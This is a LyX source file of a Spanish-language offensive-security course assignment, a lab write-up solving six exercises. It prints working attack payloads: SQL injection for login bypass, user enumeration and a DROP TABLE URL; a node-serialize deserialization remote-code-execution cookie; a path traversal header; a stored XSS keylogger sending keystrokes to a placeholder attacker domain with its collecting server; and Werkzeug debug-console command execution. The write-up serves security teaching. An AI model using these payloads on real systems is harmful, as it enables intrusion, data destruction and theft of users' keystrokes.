#LyX 2.3 created this file. For more info see http://www.lyx.org/
\lyxformat 544
\begin_document
\begin_header
\save_transient_properties true
\origin unavailable
\textclass article
\begin_preamble
\usepackage{pgfplots}
\end_preamble
\use_default_options true
\begin_modules
tcolorbox
\end_modules
\maintain_unincluded_children false
\language spanish-mexico
\language_package default
\inputencoding auto
\fontencoding global
\font_roman "default" "default"
\font_sans "default" "default"
\font_typewriter "default" "default"
\font_math "auto" "auto"
\font_default_family default
\use_non_tex_fonts false
\font_sc false
\font_osf false
\font_sf_scale 100 100
\font_tt_scale 100 100
\use_microtype false
\use_dash_ligatures true
\graphics default
\default_output_format default
\output_sync 0
\bibtex_command default
\index_command default
\paperfontsize 12
\spacing single
\use_hyperref false
\papersize default
\use_geometry false
\use_package amsmath 1
\use_package amssymb 1
\use_package cancel 1
\use_package esint 1
\use_package mathdots 1
\use_package mathtools 1
\use_package mhchem 1
\use_package stackrel 1
\use_package stmaryrd 1
\use_package undertilde 1
\cite_engine basic
\cite_engine_type default
\biblio_style plain
\use_bibtopic false
\use_indices false
\paperorientation portrait
\suppress_date false
\justification true
\use_refstyle 1
\use_minted 1
\index Index
\shortcut idx
\color #008000
\end_index
\secnumdepth 3
\tocdepth 3
\paragraph_separation indent
\paragraph_indentation default
\is_math_indent 0
\math_numbering_side default
\quotes_style french
\dynamic_quotes 0
\papercolumns 1
\papersides 1
\paperpagestyle default
\tracking_changes false
\output_changes false
\html_math_output 0
\html_css_as_file 0
\html_be_strict false
\end_header

\begin_body

\begin_layout Title
Seguridad Ofensiva 2020: Trabajo Práctico 2
\end_layout

\begin_layout Author
Federico Juan Badaloni y Damián Ariel Marotte
\end_layout

\begin_layout Standard
\begin_inset Newpage pagebreak
\end_inset


\end_layout

\begin_layout Section*
Ejercicio 1
\end_layout

\begin_layout Subsection*
Apartado a
\end_layout

\begin_layout Standard
Para obtener el secreto de bob, se puede realizar el siguiente procedimiento:
\end_layout

\begin_layout Enumerate
El primer paso es testear si la aplicación es vulnerable a inyección de
 código SQL.
 Para ello fue suficiente con rellenar el campo usuario con un apostrofe
 
\begin_inset Quotes fld
\end_inset


\begin_inset listings
lstparams "language=TeX"
inline true
status open

\begin_layout Plain Layout

'
\end_layout

\end_inset


\begin_inset Quotes frd
\end_inset

 y el campo Password con cualquier cosa.
\end_layout

\begin_layout Enumerate
El error que se produce no solo confirma nuestra sospecha, si no que ademas
 revela otra vulnerabilidad: el depurador del servidor esta configurado
 para revelar el código fuente ante un error, basta hacer click sobre la
 linea de código correspondiente para observarlo.
\end_layout

\begin_layout Enumerate
El código fuente nos revela información sobre la consulta que se está realizando
\end_layout

\begin_deeper
\begin_layout Standard
\begin_inset listings
lstparams "language=Python"
inline false
status open

\begin_layout Plain Layout

query = """SELECT id, password_hash, salt FROM users
\end_layout

\begin_layout Plain Layout

           WHERE username = '%s' LIMIT 1""" % username
\end_layout

\end_inset


\end_layout

\begin_layout Standard
y sobre como se procesa la contraseña ingresada en el formulario
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=Python"
inline false
status open

\begin_layout Plain Layout

calculated_hash = hashlib.sha256(salt + password + salt)
\end_layout

\end_inset


\end_layout

\end_deeper
\begin_layout Enumerate
El siguiente paso consiste en diseñar la consulta que inyectará el código
 SQL.
\end_layout

\begin_deeper
\begin_layout Enumerate
Interrumpimos la consulta original con un apostrofe 
\begin_inset Quotes fld
\end_inset


\begin_inset listings
lstparams "language=TeX"
inline true
status open

\begin_layout Plain Layout

'
\end_layout

\end_inset


\begin_inset Quotes frd
\end_inset

.
 Esto hará que la consulta no devuelva ninguna fila.
\end_layout

\begin_layout Enumerate
Unimos al resultado anterior (vacío) una fila con la identificación del
 usuario bob e información constante: un hash conocido y sal vacía 
\begin_inset listings
lstparams "language=SQL,breaklines=true"
inline false
status open

\begin_layout Plain Layout

UNION SELECT id,
\end_layout

\begin_layout Plain Layout

'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb',
\end_layout

\begin_layout Plain Layout

'' FROM users WHERE username = 'bob'
\end_layout

\end_inset


\end_layout

\begin_layout Enumerate
Agregamos un comentario y un espacio al final, para bloquear el resto de
 la consulta original 
\begin_inset Quotes fld
\end_inset


\begin_inset listings
lstparams "language=SQL"
inline true
status open

\begin_layout Plain Layout

-- 
\end_layout

\end_inset


\begin_inset Quotes frd
\end_inset

.
\end_layout

\end_deeper
\begin_layout Enumerate
Luego se introduce la cadena diseñada previamente en el campo de Usuario,
 y la contraseña correspondiente al hash conocido (en nuestro caso 
\begin_inset Quotes fld
\end_inset

a
\begin_inset Quotes frd
\end_inset

) en el campo Password.
\end_layout

\begin_layout Standard
Al finalizar el proceso, se obtiene el mensaje desado: 
\begin_inset Quotes fld
\end_inset

Gate's Gm@Il Passw0rd R3m1nder: Ennyn Durin Aran Moria.
 Pedo Mellon a Minno.
 Im Narvi hain echant.
 Celebrimbor o Eregion teithant i thiw hin.
\begin_inset Quotes frd
\end_inset


\end_layout

\begin_layout Subsection*
Apartado b
\end_layout

\begin_layout Standard
Basándonos en nuestro trabajo anterior, y haciendo uso de la funcion 
\begin_inset Quotes fld
\end_inset


\begin_inset listings
lstparams "language=SQL"
inline true
status open

\begin_layout Plain Layout

COUNT
\end_layout

\end_inset


\begin_inset Quotes frd
\end_inset

 del lenguaje SQL puede inyectarse la siguiente consulta:
\begin_inset Newline newline
\end_inset


\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=TeX"
inline true
status open

\begin_layout Plain Layout

'
\end_layout

\end_inset


\begin_inset listings
lstparams "language=SQL"
inline true
status open

\begin_layout Plain Layout

UNION SELECT COUNT(id),
\end_layout

\end_inset


\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=SQL,breaklines=true"
inline true
status open

\begin_layout Plain Layout

'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb',
\end_layout

\end_inset


\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=SQL"
inline true
status open

\begin_layout Plain Layout

'' FROM users -- 
\end_layout

\end_inset


\begin_inset Newline newline
\end_inset


\end_layout

\begin_layout Standard
La consulta anterior produce un error que da cuentas de la cantidad de usuarios
 en dicha tabla: 
\begin_inset listings
lstparams "language=TeX"
inline true
status open

\begin_layout Plain Layout

KeyError: '6'
\end_layout

\end_inset

.
\end_layout

\begin_layout Subsection*
Apartado c 
\end_layout

\begin_layout Standard
Análogamente al apartado anterior puede seleccionarse el campo 
\begin_inset listings
lstparams "language=SQL"
inline true
status open

\begin_layout Plain Layout

GROUP_CONCAT(username)
\end_layout

\end_inset

, logrando obtener de esta manera los nombres de los usuarios:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=TeX"
inline false
status open

\begin_layout Plain Layout

KeyError: 'cacho,bob,john,mallory,eve,kisio'
\end_layout

\end_inset


\end_layout

\begin_layout Section*
Ejercicio 2
\end_layout

\begin_layout Subsection*
Apartado a
\end_layout

\begin_layout Standard
El servidor esta utilizando el framework Express, para Node.js
\end_layout

\begin_layout Subsection*
Apartado b
\end_layout

\begin_layout Standard
Luego de acceder al sitio por primera vez, puede observarse el siguiente
 error en los sucesivos ingresos:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=TeX,fontsize={\scriptsize}"
inline false
status open

\begin_layout Plain Layout

SyntaxError: Unexpected token F in JSON at position 79
\end_layout

\begin_layout Plain Layout

    at JSON.parse (<anonymous>)
\end_layout

\begin_layout Plain Layout

    at Object.exports.unserialize (/under/node_modules/node-serialize/lib/serializ
e.js:62:16)
\end_layout

\begin_layout Plain Layout

    at /under/server.js:12:29
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Esto nos revela no solo que nuestro navegador ahora posee una cookie, sino
 que además esta siendo procesada por deserialización.
 Esto permite la ejecución de código remoto, como se vera a continuación.
\end_layout

\begin_layout Subsection*
Apartado c
\end_layout

\begin_layout Standard
Usando las herramientas para desarrolladores del navegador, podemos observar
 el contenido de la cookie:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=TeX,fontsize={\normalsize}"
inline false
status open

\begin_layout Plain Layout

eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZnMzNGdnZGdja
\end_layout

\begin_layout Plain Layout

Gp3bnphMGw9IiwiRXhwaXJlcz0iOkZyaWRheSwgMTMgT2N0IDIwMTggMDA6MDA6MDAgR01UIn0%3D
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Sospechamos que se encuentra codificada en base 64.
 Un posterior proceso de decodificación confirma lo que imaginamos:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=TeX"
inline false
status open

\begin_layout Plain Layout

{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=",
\end_layout

\begin_layout Plain Layout

"Expires=":Friday, 13 Oct 2018 00:00:00 GMT"}7.
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Con toda esta información disponible, diseñamos la función que atacará el
 sitio y la serializamos.
 El siguiente código en JavaScript 
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=TeX"
inline false
status open

\begin_layout Plain Layout

var payload = {
\end_layout

\begin_layout Plain Layout

  username : function() {
\end_layout

\begin_layout Plain Layout

      var tmp = require('child_process').execSync;
\end_layout

\begin_layout Plain Layout

      return tmp('cat server.js')
\end_layout

\begin_layout Plain Layout

  }
\end_layout

\begin_layout Plain Layout

}
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

var serialize = require('node-serialize');
\end_layout

\begin_layout Plain Layout

console.log(serialize.serialize(payload));
\end_layout

\end_inset


\end_layout

\begin_layout Standard
produce la siguiente salida
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=TeX,fontsize={\normalsize}"
inline false
status open

\begin_layout Plain Layout

{"username":"_$$ND_FUNC$$_function() {
\backslash
n
\end_layout

\begin_layout Plain Layout

var tmp = require('child_process').execSync;
\backslash
n
\end_layout

\begin_layout Plain Layout

return tmp('cat server.js')
\backslash
n  }"}
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Solo resta agregar 
\begin_inset listings
lstparams "language=TeX"
inline true
status open

\begin_layout Plain Layout

()
\end_layout

\end_inset

 antes de las ultimas comillas, codificar nuevamente en base 64 y modificar
 la cookie.
 El resultado final es el siguiente:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=TeX,fontsize={\normalsize},tabsize=2"
inline false
status open

\begin_layout Plain Layout

Hello
\end_layout

\begin_layout Plain Layout

var express = require('express');
\end_layout

\begin_layout Plain Layout

var cookieParser = require('cookie-parser');
\end_layout

\begin_layout Plain Layout

var escape = require('escape-html');
\end_layout

\begin_layout Plain Layout

var serialize = require('node-serialize');
\end_layout

\begin_layout Plain Layout

var fs = require('fs');
\end_layout

\begin_layout Plain Layout

var app = express();
\end_layout

\begin_layout Plain Layout

app.use(cookieParser()) app.get('/', function(req, res) {
\end_layout

\begin_layout Plain Layout

	if (req.cookies.profile) {
\end_layout

\begin_layout Plain Layout

		var str = new Buffer(req.cookies.profile, 'base64').toString();
\end_layout

\begin_layout Plain Layout

		var obj = serialize.unserialize(str);
\end_layout

\begin_layout Plain Layout

		if (obj.username) {
\end_layout

\begin_layout Plain Layout

			res.send("Hello " + escape(obj.username));
\end_layout

\begin_layout Plain Layout

		}
\end_layout

\begin_layout Plain Layout

	} else {
\end_layout

\begin_layout Plain Layout

		res.cookie('profile',
\end_layout

\begin_layout Plain Layout

		"eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZnMzNGdnZGdja
Gp3bnphMGw9IiwiRXhwaXJlcz0iOkZyaWRheSwgMTMgT2N0IDIwMTggMDA6MDA6MDAgR01UIn0=",
\end_layout

\begin_layout Plain Layout

		{ maxAge: 900000, httpOnly: true });
\end_layout

\begin_layout Plain Layout

		res.send("The site is not yet complete, Come Back Later! <br>
\end_layout

\begin_layout Plain Layout

		<img src=
\backslash
"http://4.bp.blogspot.com/-Z9dJiifAj7g/VrIkhsdHhoI/AAAAAAAABxU/Te7Z3QKfjVQ/s1600/we
bsite_building_modern_line_style_web_construction_creative_design_development_ve
ctor_illustration_concept.jpg
\backslash
"
\end_layout

\begin_layout Plain Layout

		alt=
\backslash
"doh
\backslash
"> ");
\end_layout

\begin_layout Plain Layout

	}
\end_layout

\begin_layout Plain Layout

});
\end_layout

\begin_layout Plain Layout

app.listen(6789);
\end_layout

\end_inset


\end_layout

\begin_layout Section*
Ejercicio 3
\end_layout

\begin_layout Subsection*
Apartado a
\end_layout

\begin_layout Standard
El sitio web es vulnerable a ataques de tipo SQL Injection.
 Si se accede a la siguiente URL, se pueden borrar tablas de la base de
 datos:
\end_layout

\begin_layout Standard
\begin_inset listings
inline false
status open

\begin_layout Plain Layout

http://143.0.100.198:5010/meme?id=1; DROP TABLE memes
\end_layout

\end_inset


\end_layout

\begin_layout Subsection*
Apartado b
\end_layout

\begin_layout Standard
No hemos logrado obtener el código fuente de la aplicación, pero la aplicación
 
\begin_inset listings
lstparams "language=bash"
inline true
status open

\begin_layout Plain Layout

sqlmap
\end_layout

\end_inset

 nos permitió obtener el contenido de la base de datos.
\end_layout

\begin_layout Standard
\begin_inset listings
inline false
status open

\begin_layout Plain Layout

Database: memes_db
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

Table: albums
\end_layout

\begin_layout Plain Layout

[1 entry]
\end_layout

\begin_layout Plain Layout

+----+--------+
\end_layout

\begin_layout Plain Layout

| id | title  |
\end_layout

\begin_layout Plain Layout

+----+--------+
\end_layout

\begin_layout Plain Layout

| 1  | Random |
\end_layout

\begin_layout Plain Layout

+----+--------+
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

Table: memes
\end_layout

\begin_layout Plain Layout

[5 entries]
\end_layout

\begin_layout Plain Layout

+----+----------------+--------+-------------------+
\end_layout

\begin_layout Plain Layout

| id | title          | parent | filename          |
\end_layout

\begin_layout Plain Layout

+----+----------------+--------+-------------------+
\end_layout

\begin_layout Plain Layout

| 1  | Gondor Captain | 1      | files/boromir.jpg |
\end_layout

\begin_layout Plain Layout

| 2  | GranMa         | 1      | files/cookies.jpg |
\end_layout

\begin_layout Plain Layout

| 3  | You            | 1      | files/hacker.jpg  |
\end_layout

\begin_layout Plain Layout

| 4  | Not too fine   | 1      | files/fine.png    |
\end_layout

\begin_layout Plain Layout

| 5  | Diegote        | 1      | klpsrmfazznufesg  |
\end_layout

\begin_layout Plain Layout

+----+----------------+--------+-------------------+
\end_layout

\end_inset


\end_layout

\begin_layout Section*
Ejercicio 4
\end_layout

\begin_layout Subsection*
Apartado a
\end_layout

\begin_layout Standard
La función 
\begin_inset listings
lstparams "language=PHP"
inline true
status open

\begin_layout Plain Layout

sanitizeLang
\end_layout

\end_inset

 no hace una sanitización correcta.
 La siguiente request
\end_layout

\begin_layout Standard
\begin_inset listings
inline false
status open

\begin_layout Plain Layout

GET / HTTP/1.1
\end_layout

\begin_layout Plain Layout

Host: localhost:8080
\end_layout

\begin_layout Plain Layout

Accept-Language: ....//secreto
\end_layout

\end_inset


\end_layout

\begin_layout Standard
permite leakear el archivo 
\begin_inset listings
lstparams "language=TeX"
inline true
status open

\begin_layout Plain Layout

secreto
\end_layout

\end_inset

 que se encuentra por fuera del directorio 
\begin_inset listings
lstparams "language=TeX"
inline true
status open

\begin_layout Plain Layout

lang
\end_layout

\end_inset

.
 Esto se debe a que si bien 
\begin_inset listings
lstparams "language=PHP"
inline true
status open

\begin_layout Plain Layout

sanitizeLang
\end_layout

\end_inset

 remueve las ocurrencias de 
\begin_inset listings
lstparams "language=TeX"
inline true
status open

\begin_layout Plain Layout

../
\end_layout

\end_inset

 en el path, no checkea que el resutado luego del reemplazo no contenga
 nuevamente un 
\begin_inset listings
lstparams "language=TeX"
inline true
status open

\begin_layout Plain Layout

../
\end_layout

\end_inset

.
\end_layout

\begin_layout Subsection*
Apartado b
\end_layout

\begin_layout Standard
Esto puede arreglarse facilmente reemplazando 
\begin_inset listings
lstparams "language=PHP"
inline true
status open

\begin_layout Plain Layout

sanitizeLang
\end_layout

\end_inset

 por la siguiente función:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=PHP"
inline false
status open

\begin_layout Plain Layout

private function sanitizeLang($lang) {
\end_layout

\begin_layout Plain Layout

    while(strpos($lang, '../') !== FALSE)
\end_layout

\begin_layout Plain Layout

    $lang = str_replace('../', '', $lang);
\end_layout

\begin_layout Plain Layout

    return $lang;
\end_layout

\begin_layout Plain Layout

}
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Sin embargo es probable que existan otras posibilidades de ataque que desconozca
mos, es por eso que es preferible utilizar la función de PHP 
\begin_inset listings
lstparams "language=PHP"
inline true
status open

\begin_layout Plain Layout

filter_var
\end_layout

\end_inset

 aplicando el filtro 
\begin_inset listings
lstparams "language=PHP"
inline true
status open

\begin_layout Plain Layout

FILTER_SANITIZE_URL
\end_layout

\end_inset

.
\end_layout

\begin_layout Section*
Ejercicio 5
\end_layout

\begin_layout Standard
Un ataque de Cross-Site Scripting (XSS) es un tipo de ataque en el que se
 inyecta código malicioso en un sitio benigno.
 En este caso, aprovecharemos la vulnerabilidad en el campo de comentarios
 en 
\begin_inset listings
lstparams "language=TeX"
inline true
status open

\begin_layout Plain Layout

dvwa/vulnerabilities/xss_s/
\end_layout

\end_inset

 que inserta en el sitio, visible por todos los futuros visitantes, lo que
 se le ingrese en el formulario de comentarios sin ningún tipo de sanitización.
 Aprovecharemos esto para insertar código JavaScript.
\end_layout

\begin_layout Standard
El único obstáculo que deberemos superar es que el límite de tamaño de los
 comentarios insuficiente para escribir un script útil, pero podemos superar
 esa limitación cargando el script remotamente.
 Usaremos el siguiente comentario:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=HTML"
inline false
status open

\begin_layout Plain Layout

<script src="http://<<dominio-atacante>>/src" type="text/javascript"></script>
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Mientras que en nuestro dominio atacante, levantaremos un sencillo servidor
 Flask con el siguiente código Python 3:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=Python"
inline false
status open

\begin_layout Plain Layout

from flask import Flask, request
\end_layout

\begin_layout Plain Layout

app = Flask(__name__)
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

# Recibe las reclas y las imprime en pantalla.
\end_layout

\begin_layout Plain Layout

@app.route('/log/<key>', methods=["GET"])
\end_layout

\begin_layout Plain Layout

def keylog(key):
\end_layout

\begin_layout Plain Layout

    print(f"{request.remote_addr} pressed: {key}")
\end_layout

\begin_layout Plain Layout

    return ""
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

# Envia el script para superar el limite de catacteres
\end_layout

\begin_layout Plain Layout

@app.route('/src', methods=["GET"])
\end_layout

\begin_layout Plain Layout

def script():
\end_layout

\begin_layout Plain Layout

    return 
\backslash

\end_layout

\begin_layout Plain Layout

"""
\end_layout

\begin_layout Plain Layout

    var keylogger_server = "http://<<dominio-atacante>>/log/"
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

    document.onkeypress = function (e) {
\end_layout

\begin_layout Plain Layout

        var xhttp = new XMLHttpRequest();
\end_layout

\begin_layout Plain Layout

        xhttp.open("GET", keylogger_server + e.key, true);
\end_layout

\begin_layout Plain Layout

        xhttp.send();
\end_layout

\begin_layout Plain Layout

    }
\end_layout

\begin_layout Plain Layout

"""
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

if __name__ == '__main__':
\end_layout

\begin_layout Plain Layout

    app.run()
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Este servidor envía el script malicioso cuando se carga la página y se encarga
 luego de recibirlas teclas.
\end_layout

\begin_layout Section*
Ejercicio 6
\end_layout

\begin_layout Subsection*
Apartado a
\end_layout

\begin_layout Standard
Si se analizan en un proxy las respuestas a los request que realiza el navegador
 al ingresar al sitio, puede observarse el siguiente dato:
\end_layout

\begin_layout Standard
\begin_inset listings
inline false
status open

\begin_layout Plain Layout

Server: Werkzeug/0.10.4 Python/2.7.12
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Dicho servidor provee en algunas configuraciones una consola de depuración
 en el path 
\begin_inset listings
lstparams "language=TeX"
inline true
status open

\begin_layout Plain Layout

/console
\end_layout

\end_inset

.
 Puede aprovecharse esa consola para ejecutar el siguiente código en Python:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=Python"
inline false
status open

\begin_layout Plain Layout

import subprocess
\end_layout

\begin_layout Plain Layout

print(subprocess.check_output("cat flag.txt", shell=True))
\end_layout

\end_inset


\end_layout

\begin_layout Standard
el cual produce la salida 
\begin_inset Quotes fld
\end_inset

flag{ThIs_Even_PaSsED_c0d3_rewVIEW}
\begin_inset Quotes frd
\end_inset

.
\end_layout

\begin_layout Subsection*
Apartado b
\end_layout

\begin_layout Standard
El problema fue que el administrador debió deshabilitar la consola de depuración.
\end_layout

\end_body
\end_document
